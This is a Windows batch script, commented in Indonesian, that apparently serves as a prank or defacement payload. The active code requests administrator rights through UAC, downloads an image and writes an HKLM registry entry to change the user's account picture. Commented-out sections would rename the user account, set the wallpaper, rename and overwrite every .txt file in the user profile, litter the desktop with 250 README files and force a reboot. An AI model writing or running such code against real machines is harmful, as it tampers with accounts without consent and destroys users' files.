:: cek admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

::rename user local
::set currentUser=%USERNAME%
::wmic useraccount where name='%currentUser%' rename !c^f_i^H3R!


::ganti profile picture user_local
curl -L -s "https://i.ibb.co.com/fdPFj25R/paped.jpg" -o "%USERPROFILE%\Music\GD_002.jpg"
set img=%USERPROFILE%\Music\GD_002.jpg

:: ambil SID user aktif
for /f "skip=1 tokens=1" %%s in (
    'wmic useraccount where name^="%USERNAME%" get sid'
) do (
    if not "%%s"=="" (
        set SID=%%s
        goto found
    )
)
echo SID: %SID%
:: set registry account picture
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AccountPicture\Users\%SID%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AccountPicture\Users\%SID%" /v Image192 /t REG_SZ /d "%img%" /f >nul 2>&1

::Download gambar - reboot - set wallpaper ###
::@echo off
::curl -L -s "https://i.ibb.co.com/Z6WSw3cz/PATIENCE.png" -o "%USERPROFILE%\Music\GD_001.jpg"
::set img=%USERPROFILE%\Music\GD_001.jpg
::reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%img%" /f >nul 2>&1

:: rename *.txt menjadi ALLUSER
::setlocal enabledelayedexpansion
::set count=1
::for /r "%USERPROFILE%" %%f in (*.txt) do (
::    ren "%%f" "ALLUSER_!count!.txt"
::    set /a count+=1
::)

::ubah isi *.txt - hello word
::for /r "%USERPROFILE%" %%f in (*.txt) do (
::    echo hello word > "%%f"
::)

::create readme.desktop
::setlocal enabledelayedexpansion
::for /l %%i in (1,1,250) do (
::    echo sarcas1111 > "%USERPROFILE%\Desktop\README%%i.txt"
::)

::restart
::shutdown /r /t 0
